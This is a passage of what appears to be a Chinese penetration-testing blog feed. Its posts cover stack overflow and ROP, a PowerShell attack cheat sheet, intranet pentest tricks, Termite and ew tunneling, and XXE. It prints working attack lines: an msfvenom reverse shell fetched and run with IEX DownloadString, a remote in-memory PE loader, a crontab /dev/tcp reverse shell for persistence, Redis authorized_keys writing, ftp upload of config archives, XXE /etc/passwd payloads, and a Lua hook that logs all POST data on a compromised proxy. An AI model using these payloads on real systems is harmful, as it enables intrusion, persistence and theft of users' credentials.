system()是system()在内存中的地址，用来覆盖返回地址。padding2出的数据长度为4（32位机），对应调用system()时的返回地址。因为我们这里只需要打开shell就可以，不关心shell退出之后的行为，所以padding2内容可以随意填充。address of “/bin/sh”时字符串”/bin/sh”在内存中的地址，作为传给system()的参数.</p><h3 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h3><ul><li><p>shellcode中不能包含空格字符(<code>\x10</code>,<code>\x0a</code>,<code>\x0b</code>,<code>\x0c</code>,<code>\x20</code>),否则shellcode会被截断。</p></li><li><p>由于shellcode被加载到栈上的位置不是固定的，因此要求shellcode被加载到任意位置都能执行，也就是说shellcode中尽量使用相对寻址。</p></li></ul><h3 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP (Return Oriented Programming)"></a>ROP (Return Oriented Programming)</h3><p>有时候目标函数在内存中无法找到，有时候目标操作并没有特定的函数可以完美适配。这时需要在内存中寻找多个指令片段，拼凑一系列操作来达成目的。假如要执行某段指令（我们将其称为”gadget”，小工具），溢出的数据应以下方式构造。如果想执行若干指令，需要每个gadget执行完毕之后交给下一额gadget，所以dadget的最后一步指令应该是RET，这样，程序的控制权(eip)才可以切换。所以这种技术被称为返回导向编程（Return Oriented Programming)。要执行多个gadget，溢出数据应该如下构造：</p><blockquote><p>payload: padding + address of gadget 1 + address of gadget 2 + …… </p></blockquote><ul><li>address of gadget n</li></ul><p>这样的构造下，被调用函数返回会跳转执行gadget 1，执行完毕gadget的RET指令会将此时栈顶的数据（也就是gadget 2的地址）弹出到eip，程序继续执行gadget2，以此类推。</p><p><img src="/2018/07/05/stack/v2-a4964a02ab5a974439a157cf9d5b017c_hd.png"></p><p>栈溢出要实现什么样的效果:</p><p>ROP常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是int 0x80。执行这条指令时，被调用函数的编号存入eax，调用参数按照顺序依次存入ebx,ecx,edx,esi,edi中。</p><p>用exec系统调用打开一个shell终端需要的参数和指令如下:</p><pre class="line-numbers language-none"><code class="language-none">        mov rax, 0x3b   ; system call number, 0x3b for sys_exec        mov rdi, PROG   ; char *prog (program path)        mov rsi, 0      ; char **agcv        mov rdx, 0      ; char **env        syscallPROG:   DB &quot;&#x2F;bin&#x2F;sh&quot;, 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>rax为系统调用编码，rdi为字符串指针，指向可执行程序的完整路径，rsi和rdx都是字符串指针数组，保存了参数列表和环境变量。</p><h3 id="溢出保护"><a href="#溢出保护" class="headerlink" title="溢出保护"></a>溢出保护</h3><p>第一层是编译器层面，例如gcc的stack protector, vc的gs<br>第二层是操作系统层面的DEP, aslr,safeseh,sehop等</p><h4 id="0x01-金丝雀"><a href="#0x01-金丝雀" class="headerlink" title="0x01 金丝雀"></a>0x01 金丝雀</h4><p>gcc在编译的时候会自动插入一个随机的cookie，也叫做金丝雀值（历史上用金丝雀来检查煤矿中是否含有有毒气体），保存在ebp-8字节的位置，函数每次调用完成将返回地址交给eip之前会检查cookie是否被改写，如果被改写就触发异常，程序停止执行。</p><p>缺点: 开销太大，每个函数都要增加5条指令。另外只能保护函数的返回地址，无法保护jmp、call指令的跳转地址。在gcc4.9版本中默认关闭栈保护机制。</p><h4 id="0x02-NX"><a href="#0x02-NX" class="headerlink" title="0x02 NX"></a>0x02 NX</h4><p>数据执行保护(Data Execution Prevention)，在内存上严格将代码和数据进行区分，防止数据当作代码执行。从sp2开始作为一项安全机制引入，延续到2003、2008、win7。</p><p>DEP会将值暴汗内存数据的区域标记为NX(不可执行),当我们控制程序执行流程跳到shellcode的时候，触发异常。</p><p>可以将shellcode的地址写成第三发dll的导出函数，例如system启动shell</p><p>ROP可以绕过DEP。</p><h4 id="0x03-ASLR"><a href="#0x03-ASLR" class="headerlink" title="0x03 ASLR"></a>0x03 ASLR</h4><p>ASLR(Address space layout randomization)地址空间布局随机化，在vista之后的系统实现。</p><ol><li>用第三方经过aslr的dll</li><li>利用aslr的特性：</li></ol><p>aslr只对高位地址随机，例如0x12345678，每次重启低地址5678是不变的，只有高地址1234会随机为别的数值，在小端机中。低位地址在内存低位，高位地址在内存高位。也就是说，在不溢出缓冲区就能放下shellcode的情况下，将数据覆盖到返回地址的低位地址就可以。</p><p>其他两个先不记录:<a href="https://raw.githubusercontent.com/liuxigu/liuxigu.github.io/master/1.code/2016-03-24-overflow-seh.html">https://raw.githubusercontent.com/liuxigu/liuxigu.github.io/master/1.code/2016-03-24-overflow-seh.html</a></p><ul><li><a href="https://www.geego.com.tw/technical-discussion-forum/tech-tips-buffer-overflow-stack-frame-%E6%95%99%E5%AD%B8-%E7%89%A9%E4%BB%B6/">https://www.geego.com.tw/technical-discussion-forum/tech-tips-buffer-overflow-stack-frame-%E6%95%99%E5%AD%B8-%E7%89%A9%E4%BB%B6/</a></li><li><a href="http://bestwing.me/2017/03/18/stack-overflow-one/">http://bestwing.me/2017/03/18/stack-overflow-one/</a></li><li><a href="https://zhuanlan.zhihu.com/p/25816426">https://zhuanlan.zhihu.com/p/25816426</a></li><li><a href="https://www.jianshu.com/p/47d484b9227e">https://www.jianshu.com/p/47d484b9227e</a></li><li><a href="https://github.com/liuxigu/liuxigu.github.io/blob/master/1.code/2016-03-24-overflow-seh.html">https://github.com/liuxigu/liuxigu.github.io/blob/master/1.code/2016-03-24-overflow-seh.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Powershell</title>
      <link href="/2018/06/13/powershell-pen.html"/>
      <url>/2018/06/13/powershell-pen.html</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershellmsfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;端口扫描:powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;自定义端口和IP1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx内存加载运行:powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 下载文件:(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><a href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li></ul><p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p><pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt#&#x2F;usr&#x2F;bin&#x2F;env python# coding:utf-8import base64import gzipimport StringIOimport sysf &#x3D; sys.argv[1]with open(f, &quot;rb&quot;) as file:    data &#x3D; file.read()decoded&#x3D;base64.b64decode(data)res &#x3D; StringIO.StringIO(decoded)for i in gzip.GzipFile(fileobj&#x3D;res):    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透注意事项</title>
      <link href="/2018/06/05/local-network-pentest.html"/>
      <url>/2018/06/05/local-network-pentest.html</url>
      
        <content type="html"><![CDATA[<h3 id="内网定时反弹"><a href="#内网定时反弹" class="headerlink" title="内网定时反弹:"></a>内网定时反弹:</h3><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf &quot;* * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xx;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面反弹之后，在centos下面，如果没有监听shell的情况下，终端一直会有<code>you have an email in /var/spool/root</code>, 解决方法如下:</p><pre class="line-numbers language-none"><code class="language-none">echo &quot;unset MAILCHECK&quot; &gt;&gt; ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Redis写私钥"><a href="#Redis写私钥" class="headerlink" title="Redis写私钥"></a>Redis写私钥</h3><p>常规操作:</p><pre class="line-numbers language-none"><code class="language-none">config get dir  &#x2F;&#x2F;获取当前的目录, 默认: &#x2F;usr&#x2F;local&#x2F;redisconfig get dbfilename &#x2F;&#x2F; 获取当前名字 默认: dump.rdbconfig set dir &#x2F;root&#x2F;.sshconfig set dbfilename &quot;authorized_keys&quot;set xx &quot;\n\n pub_key\n\n&quot;save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后拿到shell，然后再把dir和dbfilename改回来，顺便把known_hosts给删除掉。</p><p>redis查看部分key: </p><pre class="line-numbers language-none"><code class="language-none">scan 1000 MATCH * COUNT 1000get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>在某些redis集群里面，set xx会出现个err move的错误，因为是在另外一个节点设置了相同的键值，所以改一个完全不同的名字就可以了。</p></blockquote><h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><p>实际测试，ssh隧道比ew隧道稳定，特别是在nmap端口扫描或者网络数据量比较大的情况，步骤是下面</p><pre class="line-numbers language-none"><code class="language-none">A在内网，B是VPS，C是攻击者B: socat -v tcp-listen:8080,fork tcp-connect:localhost:22A: ssh -p 8080 -qngfNTR *:7777:localhost:22 root@B的vps -i id_rsa -vT  &#x2F;&#x2F;把A主机的ssh端口反弹到B的7777端口，其中B的ssh端口是8080C: ssh -p 7777 -qngfNTD 1080 A的用户@B的地址 -i id_rsa  &#x2F;&#x2F;C可以是一个公网的地址，也可以是内网<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>第一步B先执行这个，说的是实际情况，实际情况内网存在防火墙，流量只能访问8080，所以第一步把8080端口的流量转发到22，然后内网的A主机再连接VPS的8080端口。</p><p>最后执行完，可以以C主机的1080作为socks5代理进入A的内网。</p><h3 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h3><pre class="line-numbers language-none"><code class="language-none">tar -czvf &#x2F;tmp&#x2F;conf.tar.gz .&#x2F;confcurl -v -T conf.tar.gz ftp:&#x2F;&#x2F;ftp:passwd@ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何截取openresty反向代理服务器数据包</title>
      <link href="/2018/03/02/openresty-https.html"/>
      <url>/2018/03/02/openresty-https.html</url>
      
        <content type="html"><![CDATA[<p>有一天小明日了一台windows版本nginx的https的反向的代理服务器（这语句不通顺）。。</p><h3 id="攻击背景"><a href="#攻击背景" class="headerlink" title="攻击背景"></a>攻击背景</h3><ul><li>获取https反向代理服务器的数据请求数据 </li><li>Windows平台</li></ul><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>下载openresty和nginx的windows版本，先本地测试一下。</p><p>如果直接复制openresty里面的nginx.exe到原汁原味nginx解压包里面，提示缺少dll，没毛病。</p><p>把openresty里面的nginx.exe libgcc_s_dw2-1.dll lua51.dll，一起复制到纯天然版本nginx的文件夹里面，启动nginx.exe。</p><p>把本地环境搬到目标服务器测试下，没毛病，目标网站的反代正常工作，唯一不正常的就是http的response的header变成了openresty，可以修改openresty源代码。</p><h3 id="截取POST数据包"><a href="#截取POST数据包" class="headerlink" title="截取POST数据包"></a>截取POST数据包</h3><p>根据P神的文章里面:</p><p><code>access_by_lua_file /usr/local/openresty/luasrc/fish.lua;</code></p><p>这个配置是http请求之前执行的，所以修改下这个lua文件：</p><pre class="line-numbers language-none"><code class="language-none">local method&#x3D;ngx.req.get_method()local fd &#x3D; io.open(&quot;C:\\windows\\temp\\&quot;..ngx.var.host..&quot;.txt&quot;,&quot;ab&quot;)ngx.req.read_body()local data&#x3D;ngx.req.get_body_data()local uri &#x3D; ngx.var.request_uriif fd &#x3D;&#x3D; nil then return endif method &#x3D;&#x3D; &quot;POST&quot; then    if data &#x3D;&#x3D; nil then return end    fd:write(uri..&quot;[*]&quot;..data..&quot;\n&quot;)    fd:close()end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码保存为fish.lua，然后放到nginx里面conf目录下，修改nginx.conf：</p><p><code>access_by_lua_file conf/fish.lua;</code></p><p>把上面这一行放到nginx配置的server模块外面那一层，相当于全局过滤，因为目标服务器反向代理了n个站。</p><p>参考链接：</p><ul><li><a href="https://moonbingbing.gitbooks.io/openresty-best-practices/openresty/get_req_body.html">https://moonbingbing.gitbooks.io/openresty-best-practices/openresty/get_req_body.html</a></li><li><a href="http://wooyun.jozxing.cc/static/drops/tips-6403.html">http://wooyun.jozxing.cc/static/drops/tips-6403.html</a></li></ul><p>坑点：</p><ul><li><p>由于是直接在目标服务器操作的，中间把站点给down了n+n次，修改lua文件n次，主要依靠error.log来修改fish.lua，中间要判断data不为nil，参考上面文章。</p></li><li><p>openresty启动指定配置文件要绝对路径。</p></li><li><p>如果lua在执行过程中出错（比如我碰到的data数据为空，虽然反代正常工作，但是用户登录就出错），服务器会报500，所以<strong>绝对</strong>保证lua文件不能出错。</p></li></ul><p>最后达到什么效果： 截取所有的post数据和uri，根据域名放到不通的txt文件里面。 </p><p>没图说个蛋蛋：</p><p><img src="https://i.loli.net/2017/07/25/5977478193da9.png"></p><p><img src="https://i.loli.net/2017/07/25/597748509b5b3.png"></p><h3 id="课后思考："><a href="#课后思考：" class="headerlink" title="课后思考："></a>课后思考：</h3><p>最后一个：如果某天撸了openresty的服务器，肿么感觉可以在配置里面留下一个lua的后门哩？</p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Termite代理工具</title>
      <link href="/2018/02/03/termite-socks.html"/>
      <url>/2018/02/03/termite-socks.html</url>
      
        <content type="html"><![CDATA[<p>网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的</p><p>正向socks v5服务器</p><p><a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>以上面这个文章作为例子，来说下对应的转发与代理</p><p>如果目标有一个外网IP：</p><p>ew来说建立socks代理服务：</p><p><code>ew -s ssocksd -l 8888</code></p><p>Termite:</p><pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888admin_exe -c [tartet_ip] -p 8888然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：goto 1socks 1080此时VPS上面的1080就架设了一个服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="反弹socks服务器"><a href="#反弹socks服务器" class="headerlink" title="反弹socks服务器"></a>反弹socks服务器</h2><p>假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：</p><pre class="line-numbers language-none"><code class="language-none">VPS： ew -s rcsocks -l 1080 -e 888Target: ew -s rssocks -d 139.x.x.113 -e 888此时就可以以vps上面1080端口作为代理进入内网<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Termite:</p><pre class="line-numbers language-none"><code class="language-none">VPS:  .&#x2F;agent_exe -l 888Target: .&#x2F;agent_exe -c [139.x.x.113] -p 888VPS: .&#x2F;admin_exe -c 127.0.0.1 -p 888此时获取一个admin的终端，然后查看节点，target会变成2节点，goto 2socks 1080  &#x2F;&#x2F;现在可以以vps上面1080作为代理进入目标内网shell 6666  &#x2F;&#x2F;在vps上面直接nc 127.0.0.1 6666可以获取目标主机的shelldownfile和upfile  &#x2F;&#x2F;可以直接下载上传文件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二级网络环境-一"><a href="#二级网络环境-一" class="headerlink" title="二级网络环境(一)"></a>二级网络环境(一)</h3><p><a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a> </p><p>这个环境稍微复杂一点，大家可以看着图</p><pre class="line-numbers language-none"><code class="language-none">分为4个步骤：VPS: ew -s lcx_listen -l 10800 -e 888  &#x2F;&#x2F;在vps上面添加转接隧道，把10800端口收到的代理请求转发给888B: ew -s ssocksd -l 999   &#x2F;&#x2F;B主机启动socks代理，端口999A: ew -s lcx_slave -d 139.x.x.113 -e 888 -f 10.48.128.49 -g 999 &#x2F;&#x2F;在A主机上面使用lcx_slave的方式，把公网的888端口和B主机的999端口连接起来现在可以通过vps的10800来使用B主机架设的socks5代理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Termite是这样:</p><pre class="line-numbers language-none"><code class="language-none">VPS: .&#x2F;agent_exe -l 888A主机: .&#x2F;agent_exe -c [139.x.x.113] -p 888VPS: .&#x2F;admin_exe -c 127.0.0.1 -p 888goto 2listen 999B主机: .&#x2F;agent_exe -c 10.48.128.49 -p 999此时B主机节点是3goto 3 socks 10800此时就可以以VPS上面的10800作为socks代理，进入B的内网。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面的操作可以看出来Termite只要把agent节点互相连接起来，就可以在admin里面跳来跳去，跳到哪里就可以以那个节点作为socks代理，或者端口转发，或者把那个节点开一个shell。</p><p>比如上面在B主机开一个shell:</p><pre class="line-numbers language-none"><code class="language-none">goto 3shell 7777然后在vps上面 nc 127.0.0.1 7777就获得B主机的shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一句话: 只要agent节点之间互联，admin就可以随便跳</p><h3 id="三级网络环境"><a href="#三级网络环境" class="headerlink" title="三级网络环境:"></a>三级网络环境:</h3><p>ew是这样操作的:</p><pre class="line-numbers language-none"><code class="language-none">VPS: ew -s rcsoskc -l 1080 -e 888A: ew -s lcx_slave -d 139.x.x.113 -e 888 -f 10.48.128.12 -g 999B: ew -s lcx_listen -l 999 -e 777C: ew -s rssocks -d 10.48.128.12 -e 777此时就可以通过VPS上面的139.x.x.113的1080端口来使用在C主机架设的socks5代理<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Termite:</p><pre class="line-numbers language-none"><code class="language-none">VPS: .&#x2F;agent_exe -l 888A主机: .&#x2F;agent_exe -c [139.x.x.113] -p 888VPS: .&#x2F;admin_exe -c 127.0.0.1 -p 888B: .&#x2F;agent_exe -l 999  &#x2F;&#x2F;B主机开启一个监听goto 2 &#x2F;&#x2F;跳转到A节点connect 10.48.128.12  999 &#x2F;&#x2F;连接到B主机C: .&#x2F;agent_exe -l 777goto 3  &#x2F;&#x2F;跳转到B主机节点connect 192.168.0.10 777  &#x2F;&#x2F;在B节点连接C主机或者在C节点直接连接B:goto 3 &#x2F;&#x2F;跳到Blisten 666C: .&#x2F;agent_exe -c 10.48.128.12 666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上面的连接方式可能会存在错误的地方，请指正 ＝。＝  另外各位大佬在使用过程中有啥问题，也丢出来一起讨论下呗</p><p>注意的点：</p><ul><li>shell指令在使用nc连接过去之后，如果10s内没操作会自动断开，这个作者在视频里说过了，大家如果有需求可以发邮件给作者</li><li>lcxtran这个忘了说了，这个跟上面指令差不多，是一个端口转发。比如在B节点lcxtran 10000 C的IP 3389，此时连接vps上面的10000就可以连接C的3389啦</li></ul><p>参考资料:</p><ul><li><a href="http://rootkiter.com/Termite/README.txt">http://rootkiter.com/Termite/README.txt</a></li><li><a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XXE学习笔记</title>
      <link href="/2018/02/02/xxe.html"/>
      <url>/2018/02/02/xxe.html</url>
      
        <content type="html"><![CDATA[<p>XML基础：</p><p>XML文档结构：</p><pre class="line-numbers language-none"><code class="language-none">XML声明&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;DTD文档类型定义&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;]]]文档元素&lt;note&gt;&lt;to&gt;Dave&lt;&#x2F;to&gt;&lt;from&gt;Tom&lt;&#x2F;from&gt;&lt;head&gt;Reminder&lt;&#x2F;head&gt;&lt;body&gt;You are a good man&lt;&#x2F;body&gt;&lt;&#x2F;note&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DTD(document type definitions)可以定义一个合法的XML文档构建模块，可以被成行声明于XML文档中，也可以作为一个外部引用。</p><pre class="line-numbers language-none"><code class="language-none">内部声明DTD：&lt;!DOCTYPE 跟元素 [元素声明］&gt;引用外部DTD:&lt;!DOCTYPE 根元素  SYSTEM &quot;文件名&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>DTD文档中很多关键字如下: </p><ul><li>DOCTYPE(DTD的声明）</li><li>ENTITY （实体的声明）</li><li>SYSTEM、PUBLIC （外部资源申请） </li></ul><p>###实体</p><p>实体可以理解为变量，必须在DTD定义声明，可以在文档中的其它位置引用该变量的值。<br>实体按类型主要分以下四种:</p><ul><li>内置实体（Built-in entities)</li><li>字符实体（Character entities)</li><li>通用实体（General entities）</li><li>参数实体 (Parameter entities）</li></ul><p>实体根据引用方式，可以分为内部实体和外部实体。例子：</p><pre class="line-numbers language-none"><code class="language-none">内部实体：&lt;!ENTITY entity_name &quot;entity_value&quot;&gt;entity_name is the name of entity followed by its value within the double quotes or single quote.entity_value holds the value for the entity name外部实体：&lt;!ENTITY name SYSTEM &quot;URI&#x2F;URL&quot;&gt;name is the name of entity.SYSTEM is the keyword.URI&#x2F;URL is the address of the external source enclosed within the double or single quotes.外部实体声明的时候可以有两种：SYSTEM和PUBLIC&lt;!DOCTYPE name SYSTEM &quot;address.dtd&quot; [...]&gt;&lt;!DOCTYPE name PUBLIC &quot;-&#x2F;&#x2F;Beginning XML&#x2F;&#x2F;DTD Address Example&#x2F;&#x2F;EN&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><p>参数实体（Parameter entities）语法这样：</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % ename &quot;entity_value&quot;&gt;entity_value is any character that is not an &#39;&amp;&#39;, &#39;%&#39; or &#39; &quot; &#39;.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是用%实体名称声明，引用的时候也是％实体名称，其它实体（内置实体，字符实体，通用实体）直接用实体名声声明，引用的时候用&amp;。</p><p>参数实体只能在DTD中声明，DTD中引用，其它实体只能在DTD中声明，可以在xml文档中引用。</p><h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="参数实体-外部实体"><a href="#参数实体-外部实体" class="headerlink" title="参数实体+外部实体"></a>参数实体+外部实体</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [    &lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;    %name;]&gt;注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT methodName ANY &gt;&lt;!ENTITY zozhang SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;&lt;methodCall&gt;&lt;methodName&gt;&amp;zozhang;&lt;&#x2F;methodName&gt;&lt;&#x2F;methodCall&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于XXE漏洞主要引用了DTD的外部实体导致的漏洞，重点看下能引用哪些类型的外部实体，外部实体</p><pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语法引用外部实体，而非内部实体，所以URL中能写类型如下：</p><p><img src="https://thief.one/upload_image/20170620/1.png"></p><p>XXE漏洞（XML External Entity Injection)即xml外部实体注入漏洞，xxe漏洞发生在应用程序解析xml输入时，没有禁用外部实体的加载，导致可以加载恶意外部文件，造成文件读取，命令执行，内网扫描等危害。xxe的触发点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可以上传恶意xml文件。</p><p><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></p><blockquote><p>Note: Per: <a href="https://mail.gnome.org/archives/xml/2012-October/msg00045.html">https://mail.gnome.org/archives/xml/2012-October/msg00045.html</a>, starting with libxml2 version 2.9, XXE has been disabled by default as committed by the following patch: <a 